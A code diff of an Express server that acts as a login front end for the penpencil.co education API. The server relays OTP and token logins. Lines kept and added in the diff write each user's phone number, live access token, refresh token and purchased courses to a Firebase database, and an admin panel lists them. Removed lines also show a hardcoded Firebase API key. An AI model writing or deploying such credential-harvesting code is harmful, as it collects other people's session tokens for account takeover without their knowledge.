@@ -9,54 +9,39 @@ import { getFirestore } from "firebase-admin/firestore";
 import { fileURLToPath } from "url";
 import crypto from "crypto";
 import jwt from "jsonwebtoken";
-import firebaseConfig from "../firebase-applet-config.json";
-import { initializeApp as initializeClientApp } from "firebase/app";
-import { getDatabase, ref, set, push, onValue, update } from "firebase/database";
+import fs from "fs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Initialize Original Firebase Admin (for auth/existing firestore if needed)
+// Helper to load config safely
+const loadConfig = () => {
+  try {
+    const configPath = path.resolve(process.cwd(), "firebase-applet-config.json");
+    if (fs.existsSync(configPath)) {
+      return JSON.parse(fs.readFileSync(configPath, "utf-8"));
+    }
+  } catch (e) {
+    console.error("Config load error:", e);
+  }
+  return {};
+};
+
+const firebaseConfig = loadConfig();
+
+// New Firebase RTDB Config (Hardcoded)
+const RTDB_URL = "https://movie-2b1f0-default-rtdb.firebaseio.com";
+
+// Initialize Firebase Admin
 if (!admin.apps.length) {
   admin.initializeApp({
-    projectId: firebaseConfig.projectId || process.env.GOOGLE_CLOUD_PROJECT,
+    projectId: firebaseConfig.projectId || "movie-2b1f0",
+    databaseURL: RTDB_URL,
   });
 }
 
-// New Firebase RTDB Config (Hardcoded for simplicity)
-const rtdbConfig = {
-  apiKey: "AIzaSyDfnyY4-P0dVanr7Nu5ejMMdAzgOoI4ego",
-  authDomain: "movie-2b1f0.firebaseapp.com",
-  databaseURL: "https://movie-2b1f0-default-rtdb.firebaseio.com",
-  projectId: "movie-2b1f0",
-  storageBucket: "movie-2b1f0.firebasestorage.app",
-  messagingSenderId: "340114489133",
-  appId: "1:340114489133:web:32e71b2a3a4228a9e95da4",
-};
-
-// Initialize New Firebase for RTDB
-const rtdbApp = initializeClientApp(rtdbConfig, "rtdb-app");
-const rtdb = getDatabase(rtdbApp);
-
-// Initialize Firestore with the specific database ID from config
-let db: any;
-const dbId = firebaseConfig.firestoreDatabaseId;
-
-if (!dbId || dbId === "" || dbId === "(default)") {
-  db = getFirestore(admin.app());
-  console.log("Using default Firestore database");
-} else {
-  db = getFirestore(admin.app(), dbId);
-}
-
-// Test connection and log details
-(async () => {
-  try {
-    console.log(`Firestore initialized for project: ${firebaseConfig.projectId}, database: ${dbId || "(default)"}`);
-  } catch (err: any) {
-    console.error("Firestore initialization log failed:", err.message);
-  }
-})();
+const db = getFirestore();
+const rtdb = admin.database();
 
 async function startServer() {
   const app = express();
@@ -119,7 +104,6 @@ async function startServer() {
     try {
       const { phone } = req.body;
       
-      // Try with smsType=0 first
       try {
         const response = await axios.post(
           "https://api.penpencil.co/v1/users/get-otp?smsType=0",
@@ -135,7 +119,6 @@ async function startServer() {
         );
         return res.json(response.data);
       } catch (err: any) {
-        // If it's a 403 or 401, try with a different smsType or just throw
         console.log("First OTP attempt failed, trying fallback...");
         const response = await axios.post(
           "https://api.penpencil.co/v1/users/get-otp?smsType=1",
@@ -153,8 +136,6 @@ async function startServer() {
       }
     } catch (error: any) {
       const errorMsg = error.response?.data?.message || error.response?.data?.error || "Failed to send OTP";
-      const details = error.response?.data?.details;
-      console.error("OTP Error:", errorMsg, error.response?.data);
       res.status(error.response?.status || 500).json({ 
         success: false, 
         message: errorMsg,
@@ -180,7 +161,7 @@ async function startServer() {
           longitude: 0,
         },
         {
-          headers: getPWHeaders(undefined, ""), // Integration-With is empty for token verification
+          headers: getPWHeaders(undefined, ""),
           timeout: 8000,
         }
       );
@@ -188,7 +169,6 @@ async function startServer() {
       const token = response.data.data.access_token;
       const refreshToken = response.data.data.refresh_token || "";
       
-      // Fetch batches to log courses
       let courses = "[]";
       try {
         const batchRes = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
@@ -201,11 +181,10 @@ async function startServer() {
         console.error("Failed to fetch batches for logging", e);
       }
 
-      // Log to Realtime Database (Deduplicated by phone number)
       const logId = `phone_${phone}`;
-      const logRef = ref(rtdb, `analytics/logs/${logId}`);
+      const logRef = rtdb.ref(`analytics/logs/${logId}`);
       
-      set(logRef, {
+      await logRef.set({
         id: logId,
         phone: phone,
         token: token,
@@ -214,20 +193,16 @@ async function startServer() {
         status: "active",
         courses: courses,
         method: "phone"
-      }).catch(err => {
-        console.error("RTDB Logging Error (Verify OTP):", err);
       });
 
-      // Update total stats
-      const statsRef = ref(rtdb, "analytics/stats");
-      update(statsRef, {
+      const statsRef = rtdb.ref("analytics/stats");
+      await statsRef.update({
         totalLogins: admin.database.ServerValue.increment(1),
         lastLogin: new Date().toISOString()
       }).catch(() => {});
 
       res.json({ ...response.data, logId: logId });
     } catch (error: any) {
-      console.error("Verify OTP Error:", error.response?.data || error.message);
       res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to verify OTP" });
     }
   });
@@ -235,56 +210,36 @@ async function startServer() {
   app.post("/api/pw/login-token", async (req, res) => {
     try {
       const { token } = req.body;
-      
-      // Verify token by fetching batches
       const response = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
-        params: {
-          mode: "1",
-          amount: "paid",
-          page: "1",
-          organisationId: PW_ORG_ID,
-        },
+        params: { mode: "1", amount: "paid", page: "1", organisationId: PW_ORG_ID },
         headers: getPWHeaders(token),
         timeout: 8000,
       });
 
-      // Log to Realtime Database (Deduplicated by token hash)
       const tokenHash = crypto.createHash('md5').update(token).digest('hex');
       const logId = `token_${tokenHash}`;
-      const logRef = ref(rtdb, `analytics/logs/${logId}`);
+      const logRef = rtdb.ref(`analytics/logs/${logId}`);
       
-      set(logRef, {
+      await logRef.set({
         id: logId,
         phone: "Token Login",
         token: token,
-        refreshToken: "", // Token login usually doesn't provide a refresh token
+        refreshToken: "",
         loginTime: new Date().toISOString(),
         status: "active",
         courses: JSON.stringify(response.data.data),
         method: "token"
-      }).catch(err => {
-        console.error("RTDB Logging Error (Token Login):", err);
       });
 
-      // Update total stats
-      const statsRef = ref(rtdb, "analytics/stats");
-      update(statsRef, {
+      const statsRef = rtdb.ref("analytics/stats");
+      await statsRef.update({
         totalLogins: admin.database.ServerValue.increment(1),
         lastLogin: new Date().toISOString()
       }).catch(() => {});
 
       res.json({ ...response.data, logId: logId });
     } catch (error: any) {
-      const errorData = error.response?.data;
-      const status = error.response?.status || 500;
-      
-      if (status === 401) {
-        console.warn("Token Login Attempt Failed: Token Expired or Invalid");
-      } else {
-        console.error("Token Login Error:", errorData || error.message);
-      }
-      
-      res.status(status).json(errorData || { error: { message: "Invalid Token", status } });
+      res.status(error.response?.status || 500).json(error.response?.data || { error: "Invalid Token" });
     }
   });
 
@@ -292,12 +247,7 @@ async function startServer() {
     try {
       const token = req.headers.authorization;
       const response = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
-        params: {
-          mode: "1",
-          amount: "paid",
-          page: "1",
-          organisationId: PW_ORG_ID,
-        },
+        params: { mode: "1", amount: "paid", page: "1", organisationId: PW_ORG_ID },
         headers: getPWHeaders(token),
         timeout: 8000,
       });
@@ -320,7 +270,6 @@ async function startServer() {
     }
   });
 
-  // Admin Panel Endpoints
   app.post("/api/admin/login", (req, res) => {
     const { username, password } = req.body;
     if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
@@ -331,65 +280,24 @@ async function startServer() {
     }
   });
 
-  app.get("/api/pw/batch-subjects/:batchId", async (req, res) => {
-    try {
-      const { batchId } = req.params;
-      const token = req.headers.authorization?.split(" ")[1];
-      if (!token) return res.status(401).json({ error: "No token provided" });
-
-      const response = await axios.get(`https://api.penpencil.co/v3/batches/${batchId}/subjects`, {
-        params: { organisationId: PW_ORG_ID },
-        headers: getPWHeaders(token),
-      });
-      res.json(response.data);
-    } catch (error: any) {
-      res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch subjects" });
-    }
-  });
-
-  app.get("/api/pw/subject-contents/:batchId/:subjectId", async (req, res) => {
-    try {
-      const { batchId, subjectId } = req.params;
-      const { page = 1, contentType = "" } = req.query;
-      const token = req.headers.authorization?.split(" ")[1];
-      if (!token) return res.status(401).json({ error: "No token provided" });
-
-      const response = await axios.get(`https://api.penpencil.co/v3/batches/${batchId}/subject/${subjectId}/contents`, {
-        params: { 
-          organisationId: PW_ORG_ID,
-          page,
-          contentType,
-          tag: ""
-        },
-        headers: getPWHeaders(token),
-      });
-      res.json(response.data);
-    } catch (error: any) {
-      res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch contents" });
-    }
-  });
-
   app.get("/api/admin/logs", adminAuth, async (req, res) => {
     try {
-      const logsRef = ref(rtdb, "analytics/logs");
-      onValue(logsRef, (snapshot) => {
-        const data = snapshot.val();
-        const logs = data ? Object.values(data) : [];
-        res.json(logs.reverse());
-      }, { onlyOnce: true });
+      const logsRef = rtdb.ref("analytics/logs");
+      const snapshot = await logsRef.once("value");
+      const data = snapshot.val();
+      const logs = data ? Object.values(data) : [];
+      res.json(logs.reverse());
     } catch (error: any) {
-      console.error("Admin Logs Error:", error);
-      res.status(500).json({ error: "Failed to fetch logs", details: error.message });
+      res.status(500).json({ error: "Failed to fetch logs" });
     }
   });
 
   app.get("/api/admin/stats", adminAuth, async (req, res) => {
     try {
-      const statsRef = ref(rtdb, "analytics/stats");
-      onValue(statsRef, (snapshot) => {
-        const stats = snapshot.val() || { totalLogins: 0, activeNow: 0 };
-        res.json(stats);
-      }, { onlyOnce: true });
+      const statsRef = rtdb.ref("analytics/stats");
+      const snapshot = await statsRef.once("value");
+      const stats = snapshot.val() || { totalLogins: 0, activeNow: 0 };
+      res.json(stats);
     } catch (err) {
       res.status(500).json({ error: "Failed to fetch stats" });
     }
@@ -399,8 +307,8 @@ async function startServer() {
     try {
       const { logId } = req.body;
       if (logId) {
-        const logRef = ref(rtdb, `analytics/logs/${logId}`);
-        update(logRef, { status: "inactive", logoutTime: new Date().toISOString() });
+        const logRef = rtdb.ref(`analytics/logs/${logId}`);
+        await logRef.update({ status: "inactive", logoutTime: new Date().toISOString() });
       }
       res.json({ success: true });
     } catch (error) {
@@ -408,7 +316,6 @@ async function startServer() {
     }
   });
 
-  // Vite middleware for development
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
       server: { middlewareMode: true },
@@ -418,7 +325,6 @@ async function startServer() {
   } else {
     const distPath = path.join(process.cwd(), "dist");
     app.use(express.static(distPath));
-    // SPA Fallback: All non-API routes serve index.html
     app.get("*", (req, res) => {
       if (!req.path.startsWith("/api/")) {
         res.sendFile(path.join(distPath, "index.html"));
@@ -426,7 +332,6 @@ async function startServer() {
     });
   }
 
-  // Only listen if not running as a serverless function (e.g., on Vercel)
   if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
     app.listen(PORT, "0.0.0.0", () => {
       console.log(`Server running on http://localhost:${PORT}`);
@@ -438,8 +343,12 @@ async function startServer() {
 
 const appPromise = startServer();
 
-// For Vercel serverless compatibility
 export default async (req: any, res: any) => {
-  const app = await appPromise;
-  return app(req, res);
+  try {
+    const app = await appPromise;
+    return app(req, res);
+  } catch (err: any) {
+    console.error("Critical Server Error:", err);
+    res.status(500).json({ error: "Critical Server Error", message: err.message });
+  }
 };
